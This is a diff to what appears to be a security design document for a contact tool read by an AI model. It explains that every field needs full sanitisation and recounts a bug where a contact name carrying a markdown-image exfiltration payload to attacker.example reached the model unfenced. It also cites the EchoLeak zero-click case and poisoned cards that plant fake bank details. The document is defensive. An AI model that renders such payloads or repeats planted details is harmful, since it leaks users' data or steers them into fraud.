@@ -89,6 +89,15 @@ fetch a URL carrying data in its query string. That last one is the EchoLeak sha
 CVSS 9.3), where a single crafted message nobody opened exfiltrated data during
 ordinary background processing.
 
+Those passes run over **every** field, not only the note. There are two cleaners —
+one that keeps paragraph breaks and caps at two thousand characters, one that
+collapses a value to a single line and caps at four hundred — and no third path with
+fewer passes. The distinction is worth writing down because it was got wrong once:
+the short fields were stripped of invisible characters and nothing else, so a
+formatted name of `![a](https://attacker.example/x.png?d=…)` reached the model
+through `list_contacts` intact and unfenced. A name is not safer than a note by
+virtue of being short.
+
 **The attack that matters most here does not run a tool.** A card asserting that a
 bank's real telephone number has changed, or that an invoice should now go to a
 different account, needs the model to do nothing except repeat it. There is no call
